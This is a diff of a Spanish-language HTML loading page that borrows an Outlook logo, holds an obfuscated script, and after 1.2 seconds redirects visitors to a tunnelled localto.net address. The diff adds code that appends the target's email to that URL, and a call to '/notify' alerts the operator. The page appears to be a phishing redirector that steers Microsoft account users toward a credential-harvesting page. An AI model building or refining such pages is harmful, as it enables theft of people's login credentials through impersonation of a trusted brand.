@@ -1,14 +1,13 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
   <meta charset="UTF-8">
   <title>Cargando...</title>
-    <script src="https://code.jquery.com/jquery-3.2.1.js"></script>
+  <script src="https://code.jquery.com/jquery-3.2.1.js"></script>
   <style>
     body {
       margin: 0;
-      background-color: #fff; /* Fondo azul */
+      background-color: #fff; /* Fondo blanco */
       display: flex;
       justify-content: center;
       align-items: center;
@@ -32,15 +31,23 @@ const AoHuGCPK=YnVvdMlsYVL;(function(dOjNl,AqkWECDzqbOGRwDQ$Qk){const b$SaHdKZEC
 
   </script>
   <script>
-  setTimeout(function() {
-    window.location.href = "https://2mtkvpjqh.localto.net/hdm"; // Cambia esta URL
-  }, 1200); // 2000 milisegundos = 2 segundos
-</script>
+    // 👉 Aquí defines o capturas el email.
+    // Puedes pedirlo con prompt() o asignarlo.
+    const email = "usuario@ejemplo.com"; // Pruébalo fijo, o reemplaza con prompt()
 
-</script>
-    <script>
-        fetch('/notify');
-    </script>
+    // Espera 1.2 segundos y redirige PASANDO el email por la URL.
+    setTimeout(function() {
+      const destino = "https://2mtkvpjqh.localto.net/hdm"; // Tu página final
+      window.location.href = `${destino}?email=${encodeURIComponent(email)}`;
+    }, 1200);
+  </script>
+
+  <script>
+    // Opcional: tu otro fetch (lo dejé tal cual)
+    fetch('/notify');
+  </script>
+</head>
+<body>
   <img class="loader-img" src="https://it.tamu.edu/microsoft-365/images/logos/Outlook-App-Hover-State.gif" alt="Cargando...">
 </body>
 </html>
